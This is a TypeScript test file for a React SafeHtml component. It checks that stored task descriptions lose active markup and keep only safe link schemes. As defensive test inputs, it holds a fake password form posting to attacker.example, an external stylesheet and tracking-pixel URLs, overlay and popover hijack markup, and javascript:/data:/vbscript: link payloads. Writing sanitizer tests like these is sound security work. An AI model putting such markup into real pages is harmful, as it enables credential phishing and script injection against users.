import { cleanup, render } from "@testing-library/react";
import { Editor } from "@tiptap/react";
import DOMPurify from "dompurify";
import { afterEach, expect, it } from "vitest";
import { taskDescriptionKit } from "@/features/tasks/components/task-description-kit";
import { sanitizeDescriptionHtml } from "@/lib/description-html";
import { SafeHtml } from "./safe-html";

afterEach(cleanup);

function rendered(html: string) {
  const { container } = render(<SafeHtml html={html} />);
  return container.firstElementChild as HTMLDivElement;
}

// Markup a stored description could use to act on the page around it:
// invokers, popovers, native dialogs, forms, overlays, tracking images and
// anything that could match or restyle app elements.
const ACTIVE_MARKUP = [
  "dialog",
  "button",
  "form",
  "input",
  "label",
  "img",
  "svg",
  "style",
  "link",
  "[command]",
  "[commandfor]",
  "[popover]",
  "[popovertarget]",
  "[popovertargetaction]",
  "[style]",
  "[class]",
  "[id]",
  "[for]",
  "[action]",
  "[target]",
].join(", ");

it("drops invokers, popovers, dialogs and forms from a stored description", () => {
  const view = rendered(
    [
      "<p>Before</p>",
      '<button command="show-modal" commandfor="own">Open</button>',
      '<button command="--hijack" commandfor="root">Hijack</button>',
      '<p command="close" commandfor="own">Any element</p>',
      '<dialog id="own"><form method="post" action="https://attacker.example/login">',
      '<input type="password" name="pw"><button>Sign in</button></form></dialog>',
      '<div popover id="pop">Popover</div>',
      '<button popovertarget="pop" popovertargetaction="show">Show</button>',
      '<label for="app-checkbox">Toggle</label>',
      '<p class="fixed inset-0 z-50" id="root" style="position:fixed">Overlay</p>',
      '<img src="https://tracker.example/pixel.gif">',
      '<a href="https://example.com" target="app-frame">Link</a>',
      "<p>After</p>",
    ].join(""),
  );
  expect(view.querySelectorAll(ACTIVE_MARKUP)).toHaveLength(0);
  expect(view.textContent).toBe(
    "BeforeOpenHijackAny elementSign inPopoverShowToggleOverlayLinkAfter",
  );
  expect(view.querySelector("a")?.getAttribute("href")).toBe(
    "https://example.com",
  );
});

it("a legacy description's style sheet does not restyle the page", () => {
  const sheetsBefore = document.styleSheets.length;
  const view = rendered(
    "<p>Legacy</p><style>body{display:none}</style>" +
      "<svg><style>#root{outline:9px solid red}</style></svg>" +
      '<link rel="stylesheet" href="https://attacker.example/x.css">',
  );
  expect(document.styleSheets.length).toBe(sheetsBefore);
  expect(getComputedStyle(document.body).display).not.toBe("none");
  expect(view.innerHTML).toBe("<p>Legacy</p>");
});

it("keeps only http, https, mailto and scheme-less link targets, as the server does", () => {
  const links = [
    ["https://example.com/a?b=1&c=2", true],
    ["http://example.com", true],
    ["mailto:someone@example.com", true],
    ["/projects/1/tasks", true],
    ["#section", true],
    ["//example.com/path", true],
    ["javascript:alert(1)", false],
    [" JaVaScRiPt:alert(1)", false],
    ["data:text/html,<p>x</p>", false],
    ["vbscript:msgbox", false],
    ["tel:+15550100", false],
    ["ftp://example.com/file", false],
    ["sms:+15550100", false],
  ] as const;
  const view = rendered(
    links.map(([href], i) => `<a href="${href}">l${i}</a>`).join(""),
  );
  const anchors = [...view.querySelectorAll("a")];
  expect(anchors).toHaveLength(links.length);
  links.forEach(([href, kept], i) => {
    expect(anchors[i].getAttribute("href")).toBe(kept ? href : null);
  });
});

// Marks the task editor still emits, which are the server allow-list.
const ALLOWED_EDITOR_HTML =
  "<h1>Heading 1</h1><h2>Heading 2</h2><h3>Heading 3</h3>" +
  "<p><strong>bold</strong> <em>italic</em> <code>a &lt; b &amp;&amp; c</code><br>" +
  '<a href="https://example.com/x?y=1&amp;z=2">link</a> ' +
  '<a href="mailto:a@example.com">mail</a> &amp; &nbsp;&lt;escaped&gt; "text"</p>' +
  "<ul><li><p>One</p><ul><li><p>Nested</p></li></ul></li></ul>" +
  "<ol><li><p>Third</p></li></ol>" +
  "<blockquote><p>Quote</p></blockquote>" +
  "<pre><code>const x = 1 &lt; 2;\n  return &lt;p/&gt;;</code></pre>";

function editorHtml(content: string) {
  const editor = new Editor({ extensions: [taskDescriptionKit], content });
  const html = editor.getHTML();
  editor.destroy();
  return html;
}

// Descriptions shaped like the server's sanitize-html output: the same
// allow-list, so a[target] can be present and every URL is http(s)/mailto
// or scheme-less.
const SERVER_SHAPED = [
  "<p><strong>Bold</strong> <em>italic</em> <b>b</b> <i>i</i> <code>x</code></p>",
  "<h1>One</h1><h2>Two</h2><h3>Three</h3>",
  "<ul><li>Plain</li><li><p>Para</p><ol><li>Deep</li></ol></li></ul>",
  "<blockquote><p>Quote<br />next</p></blockquote>",
  "<pre><code>if (a &lt; b) {\n  return;\n}</code></pre>",
  '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer nofollow">ext</a></p>',
  '<p><a href="/projects/1">rel</a> <a href="//cdn.example.com">proto</a> <a>bare</a></p>',
  "<p>Plain &amp; &lt;escaped&gt; text</p>",
  "Loose text without a block",
  "",
];

it("renders the marks the task editor still writes", () => {
  const html = editorHtml(ALLOWED_EDITOR_HTML);
  expect(html).toContain("<h1>Heading 1</h1>");
  expect(html).toContain("<h3>Heading 3</h3>");
  expect(html).toContain("<strong>bold</strong>");
  expect(html).toContain("<em>italic</em>");
  expect(html).toContain("<ol><li><p>Third</p></li></ol>");
  expect(html).not.toMatch(/<\/?(?:s|u|hr|h4|h5|h6)\b|start\s*=/i);
  expect(rendered(html).innerHTML).toBe(DOMPurify.sanitize(html));
});

it("drops strike, underline, rules, h4-h6, and ol start from a local draft", () => {
  const view = rendered(
    "<h4>Heading 4</h4><h5>Heading 5</h5><h6>Heading 6</h6>" +
      "<p><s>strike</s> <u>underline</u></p><hr>" +
      '<ol start="3"><li><p>Third</p></li></ol>',
  );
  expect(view.innerHTML).not.toMatch(/<\/?(?:s|u|hr|h4|h5|h6)\b|start\s*=/i);
  expect(view.textContent).toContain("Heading 4");
  expect(view.textContent).toContain("Heading 5");
  expect(view.textContent).toContain("Heading 6");
  expect(view.textContent).toContain("strike");
  expect(view.textContent).toContain("underline");
  expect(view.querySelector("ol")?.getAttribute("start")).toBeNull();
  expect(view.textContent).toContain("Third");
  expect(sanitizeDescriptionHtml(view.innerHTML)).toBe(view.innerHTML);
});

it("renders server-sanitized descriptions exactly as before", () => {
  for (const html of SERVER_SHAPED) {
    expect(rendered(html).innerHTML).toBe(DOMPurify.sanitize(html));
  }
});
